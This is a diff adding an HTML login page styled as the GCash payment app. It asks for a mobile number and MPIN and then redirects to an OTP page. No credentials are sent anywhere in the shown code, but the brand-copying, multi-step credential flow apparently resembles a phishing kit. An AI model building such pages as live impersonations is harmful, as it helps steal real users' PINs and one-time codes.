@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Login - GCash</title>
+  <style>
+    :root {
+      --primary: #00b14f;
+      --primary-dark: #0d8d42;
+      --primary-soft: #dff9eb;
+      --ink: #1c1c1e;
+      --muted: #6b7280;
+      --line: #e8ebef;
+      --shadow: 0 22px 50px rgba(15, 23, 42, 0.12);
+    }
+
+    * { box-sizing: border-box; }
+
+    html, body {
+      margin: 0;
+      font-family: Inter, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: linear-gradient(180deg, #edf7f2 0%, #f6f7fb 100%);
+      color: var(--ink);
+    }
+
+    body {
+      display: grid;
+      place-items: center;
+      padding: 24px;
+    }
+
+    .phone {
+      position: relative;
+      width: 100%;
+      max-width: 420px;
+      min-height: 820px;
+      background: linear-gradient(180deg, #fbfcff 0%, #f6f9fd 100%);
+      border-radius: 34px;
+      border: 1px solid rgba(17, 24, 39, 0.05);
+      box-shadow: var(--shadow);
+      overflow: hidden;
+      padding: 26px 20px 120px;
+    }
+
+    .topbar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 22px;
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .brand-mark {
+      width: 36px;
+      height: 36px;
+      border-radius: 12px;
+      background: linear-gradient(135deg, var(--primary) 0%, #22c55e 100%);
+      position: relative;
+      box-shadow: 0 10px 18px rgba(0, 177, 79, 0.25);
+    }
+
+    .brand-mark::before {
+      content: "G";
+      position: absolute;
+      inset: 0;
+      display: grid;
+      place-items: center;
+      color: white;
+      font-weight: 900;
+      font-size: 20px;
+    }
+
+    .brand-text {
+      font-size: 18px;
+      font-weight: 900;
+      letter-spacing: -0.04em;
+    }
+
+    .chip {
+      background: var(--primary-soft);
+      color: var(--primary-dark);
+      border-radius: 999px;
+      padding: 8px 12px;
+      font-size: 11px;
+      font-weight: 800;
+      text-transform: uppercase;
+    }
+
+    .progress-bar {
+      width: 100%;
+      height: 5px;
+      background: var(--line);
+      border-radius: 999px;
+      margin-bottom: 24px;
+      overflow: hidden;
+    }
+
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, var(--primary), #22c55e);
+      transition: width 0.3s ease;
+    }
+
+    .back-btn {
+      background: transparent;
+      border: none;
+      color: var(--primary-dark);
+      font-size: 16px;
+      font-weight: 900;
+      cursor: pointer;
+      margin-bottom: 12px;
+    }
+
+    .hero {
+      margin-top: 12px;
+      margin-bottom: 8px;
+      font-size: 36px;
+      line-height: 1.08;
+      font-weight: 900;
+      letter-spacing: -0.06em;
+    }
+
+    .sub {
+      color: var(--muted);
+      font-size: 15px;
+      line-height: 1.6;
+      margin-bottom: 24px;
+    }
+
+    .field {
+      margin-bottom: 18px;
+    }
+
+    .label {
+      display: block;
+      margin-bottom: 8px;
+      font-size: 11px;
+      text-transform: uppercase;
+      color: #4b5563;
+      font-weight: 800;
+    }
+
+    .input {
+      width: 100%;
+      height: 54px;
+      border-radius: 16px;
+      border: 1px solid var(--line);
+      background: rgba(255,255,255,0.9);
+      padding: 0 16px;
+      font-size: 15px;
+      color: var(--ink);
+      outline: none;
+      transition: 0.2s ease;
+    }
+
+    .input:focus {
+      border-color: rgba(0, 177, 79, 0.7);
+      box-shadow: 0 0 0 4px rgba(0, 177, 79, 0.12);
+    }
+
+    .row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin: 8px 0 26px;
+      color: var(--muted);
+      font-size: 13px;
+    }
+
+    .remember {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .remember input {
+      accent-color: var(--primary);
+    }
+
+    .link {
+      color: var(--primary-dark);
+      font-weight: 800;
+      text-decoration: none;
+      cursor: pointer;
+    }
+
+    button.primary {
+      width: 100%;
+      border: none;
+      background: linear-gradient(135deg, var(--primary) 0%, #13a95b 100%);
+      color: #fff;
+      height: 58px;
+      border-radius: 18px;
+      font-size: 16px;
+      font-weight: 900;
+      cursor: pointer;
+      box-shadow: 0 16px 28px rgba(0, 177, 79, 0.24);
+      transition: 0.2s ease;
+      margin-bottom: 12px;
+    }
+
+    button.primary:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 20px 36px rgba(0, 177, 79, 0.3);
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      margin: 28px 0 18px;
+      color: #9aa7b5;
+      font-size: 11px;
+      text-transform: uppercase;
+      font-weight: 800;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background: var(--line);
+    }
+
+    .socials {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 12px;
+    }
+
+    .social {
+      height: 52px;
+      border: 1px solid var(--line);
+      border-radius: 16px;
+      background: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      font-weight: 800;
+      color: var(--ink);
+      cursor: pointer;
+    }
+
+    .social .dot {
+      width: 22px;
+      height: 22px;
+      border-radius: 50%;
+      display: grid;
+      place-items: center;
+      font-size: 10px;
+      font-weight: 900;
+      color: white;
+    }
+
+    .social.google .dot { background: #e94b3d; }
+    .social.apple .dot { background: #101827; }
+
+    .footer {
+      position: absolute;
+      left: 20px;
+      right: 20px;
+      bottom: 12px;
+      text-align: center;
+      color: var(--muted);
+      font-size: 11px;
+    }
+  </style>
+</head>
+<body>
+  <div class="phone">
+    <div class="topbar">
+      <div class="brand">
+        <div class="brand-mark"></div>
+        <div class="brand-text">GCash</div>
+      </div>
+      <span class="chip">Auth</span>
+    </div>
+
+    <div class="progress-bar">
+      <div class="progress-fill" style="width: 75%;"></div>
+    </div>
+
+    <button class="back-btn" onclick="goBack()">← Back</button>
+
+    <h1 class="hero">Welcome back</h1>
+    <div class="sub">Log in to manage your money with ease and security.</div>
+
+    <div class="field">
+      <label class="label" for="mobile">Mobile number</label>
+      <input id="mobile" class="input" type="text" placeholder="0917 123 4567" />
+    </div>
+
+    <div class="field">
+      <label class="label" for="password">MPIN</label>
+      <input id="password" class="input" type="password" placeholder="Enter your MPIN" />
+    </div>
+
+    <div class="row">
+      <label class="remember">
+        <input type="checkbox" />
+        <span>Remember me</span>
+      </label>
+      <a href="#" class="link">Forgot MPIN?</a>
+    </div>
+
+    <button class="primary" onclick="proceedToOTP()">Log In</button>
+
+    <div class="divider">or continue with</div>
+
+    <div class="socials">
+      <div class="social google"><span class="dot">G</span> Google</div>
+      <div class="social apple"><span class="dot"></span> Apple</div>
+    </div>
+
+    <div style="text-align: center; margin-top: 24px;">
+      New here? <a href="#" class="link">Create account</a>
+    </div>
+
+    <div class="footer">© 2026 GCash. All rights reserved.</div>
+  </div>
+
+  <script>
+    function goBack() {
+      window.location.href = 'details.html';
+    }
+
+    function proceedToOTP() {
+      const mobile = document.getElementById('mobile').value;
+      const password = document.getElementById('password').value;
+
+      if (!mobile || !password) {
+        alert('Please enter your mobile number and MPIN');
+        return;
+      }
+
+      window.location.href = 'otp.html';
+    }
+  </script>
+</body>
+</html>
